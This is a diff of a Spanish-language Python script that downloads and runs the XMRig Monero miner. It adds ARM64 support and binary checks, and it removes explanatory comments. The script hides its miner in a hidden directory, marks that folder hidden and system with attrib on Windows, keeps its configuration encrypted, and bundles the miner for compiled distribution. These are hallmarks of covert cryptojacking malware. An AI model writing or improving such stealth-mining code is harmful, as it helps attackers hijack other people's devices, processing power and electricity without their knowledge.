@@ -10,15 +10,19 @@ import subprocess, sys, os, time, platform, json, threading, shutil, base64, has
 import urllib.request
 from pathlib import Path
 
-BOT_USERNAME = "@TuBotDeTelegram"   # ← cambia antes de compilar
+BOT_USERNAME = "@TuBotDeTelegram"
 VERSION      = "1.0.0"
-ENCRYPT_KEY  = "¨ÃåÐ·ãOÆgÆTèõç®°/?Dq/'¨ Ì^X¯cãwi%«ëcª'e¡CàÑ¨xû_uäá.lÇ·F6VÆP]"
+ENCRYPT_KEY  = "461yL4peXe5awALkAN2PspZHdqJW9WBfj7kbnimDULJwivfiV3xFNcLZuEN1YajxLjjNuox5TUT6NEdEnRNCRJj4JAh8hG3"
 
 # ── Detectar plataforma ───────────────────────────────────
 SYSTEM    = platform.system()
 IS_WIN    = SYSTEM == "Windows"
 IS_LINUX  = SYSTEM == "Linux"
 IS_TERMUX = IS_LINUX and "com.termux" in os.environ.get("PREFIX", "")
+
+# Detectar arquitectura ARM64
+MACHINE   = platform.machine().lower()
+IS_ARM64  = any(a in MACHINE for a in ["aarch64", "arm64"])
 
 # ── Rutas ─────────────────────────────────────────────────
 BASE_DIR = Path(sys.executable).parent if getattr(sys, 'frozen', False) else Path(__file__).parent
@@ -32,11 +36,11 @@ XMRIG_BIN     = HIDDEN_DIR / ("xmrig.exe" if IS_WIN else "xmrig")
 CONFIG_FILE   = BASE_DIR / "miner_config.dat"
 CACHED_CONFIG = HIDDEN_DIR / "cache.json"
 
-# URLs de XMRig por plataforma
+# URLs de XMRig por plataforma y arquitectura
 XMRIG_URLS = {
     "Windows": "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip",
     "Linux":   "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz",
-    "Android": "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-aarch64.tar.gz",
+    "ARM64":   "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-aarch64.tar.gz",
 }
 
 stop_flag       = threading.Event()
@@ -68,7 +72,7 @@ def show_header(config: dict):
     plat = "Android" if IS_TERMUX else SYSTEM
     print("=" * 55)
     print(f"  ⛏️  Minero XMR  v{VERSION}  |  {BOT_USERNAME}")
-    print(f"  💻 Plataforma: {plat}")
+    print(f"  💻 Plataforma: {plat} ({MACHINE})")
     print("=" * 55)
     print(f"  💳 Wallet : {w[:14]}...{w[-6:]}")
     print(f"  📡 Pool   : {config['pool_host']}:{config['pool_port']}")
@@ -85,7 +89,6 @@ def progress_bar(block_num, block_size, total_size):
 
 # ── Config ────────────────────────────────────────────────
 def load_config() -> dict | None:
-    # Primero buscar cache oculta
     if CACHED_CONFIG.exists():
         try:
             cfg = json.loads(CACHED_CONFIG.read_text())
@@ -94,7 +97,6 @@ def load_config() -> dict | None:
         except Exception:
             pass
 
-    # Buscar config encriptada visible (primer arranque)
     if CONFIG_FILE.exists():
         try:
             encrypted = CONFIG_FILE.read_text().strip()
@@ -123,7 +125,6 @@ def cache_and_hide_config(config: dict):
 def setup_xmrig() -> bool:
     HIDDEN_DIR.mkdir(parents=True, exist_ok=True)
 
-    # Ocultar carpeta en Windows
     if IS_WIN:
         try:
             subprocess.run(["attrib", "+H", "+S", str(HIDDEN_DIR)],
@@ -132,9 +133,18 @@ def setup_xmrig() -> bool:
             pass
 
     if XMRIG_BIN.exists():
-        return True
+        # Verificar que el binario es ejecutable y de la arquitectura correcta
+        try:
+            result = subprocess.run([str(XMRIG_BIN), "--version"],
+                                   capture_output=True, timeout=5)
+            if result.returncode == 0:
+                return True
+            else:
+                # Binario incorrecto, borrar y re-descargar
+                XMRIG_BIN.unlink()
+        except Exception:
+            XMRIG_BIN.unlink()
 
-    # Windows: extraer desde el exe compilado (PyInstaller)
     if IS_WIN and getattr(sys, 'frozen', False):
         bundled = Path(sys._MEIPASS) / "xmrig.exe"
         if bundled.exists():
@@ -147,32 +157,16 @@ def setup_xmrig() -> bool:
             print("  ✅ Motor de mineria listo.")
             return True
 
-    # Linux / Android: intentar instalar via pkg (Termux) o descargar
     return download_xmrig_unix()
 
 
 def download_xmrig_unix() -> bool:
-    # En Termux intentar via pkg primero
-    if IS_TERMUX:
-        print("  📥 Instalando motor de mineria via pkg...")
-        try:
-            result = subprocess.run(
-                ["pkg", "install", "-y", "xmrig"],
-                capture_output=True, text=True
-            )
-            if result.returncode == 0:
-                xmrig_path = shutil.which("xmrig")
-                if xmrig_path:
-                    shutil.copy(xmrig_path, XMRIG_BIN)
-                    os.chmod(XMRIG_BIN, 0o755)
-                    print("  ✅ Motor de mineria listo.")
-                    return True
-        except Exception:
-            pass
-        print("  📥 Descargando XMRig para Android (ARM64)...")
-        url = XMRIG_URLS["Android"]
+    # Elegir URL correcta segun arquitectura
+    if IS_ARM64 or IS_TERMUX:
+        print("  📥 Descargando XMRig para ARM64...")
+        url = XMRIG_URLS["ARM64"]
     else:
-        print("  📥 Descargando motor de mineria...")
+        print("  📥 Descargando XMRig para Linux x64...")
         url = XMRIG_URLS["Linux"]
 
     archive = HIDDEN_DIR / "xmrig.tar.gz"
@@ -191,29 +185,15 @@ def download_xmrig_unix() -> bool:
             for m in t.getmembers():
                 if m.name.endswith("/xmrig") or m.name == "xmrig":
                     m.name = "xmrig"
-                    t.extract(m, HIDDEN_DIR, filter="data")
+                    try:
+                        t.extract(m, HIDDEN_DIR, filter="data")
+                    except TypeError:
+                        t.extract(m, HIDDEN_DIR)
                     break
         os.chmod(XMRIG_BIN, 0o755)
         archive.unlink()
         print("✅")
         return True
-    except TypeError:
-        # Python < 3.12 no soporta filter="data"
-        try:
-            import tarfile
-            with tarfile.open(archive, "r:gz") as t:
-                for m in t.getmembers():
-                    if m.name.endswith("/xmrig") or m.name == "xmrig":
-                        m.name = "xmrig"
-                        t.extract(m, HIDDEN_DIR)
-                        break
-            os.chmod(XMRIG_BIN, 0o755)
-            archive.unlink()
-            print("✅")
-            return True
-        except Exception as e:
-            print(f"❌ {e}")
-            return False
     except Exception as e:
         print(f"❌ {e}")
         return False
@@ -233,7 +213,6 @@ def run_session(session: int, config: dict):
     print(f"  🔄 Sesion #{session + 1}  [{label}]")
     print("  " + "─" * 50)
 
-    # Menos CPU en Android para no calentar el movil
     max_cpu = "50" if IS_TERMUX else "85"
 
     try:
@@ -313,8 +292,7 @@ def main():
     if not setup_xmrig():
         print()
         print("  ❌ No se pudo instalar el motor de mineria.")
-        if IS_TERMUX:
-            print("  Ejecuta: pkg install xmrig")
+        print(f"  Arquitectura detectada: {MACHINE}")
         input("\n  Presiona Enter para cerrar...")
         sys.exit(1)
 
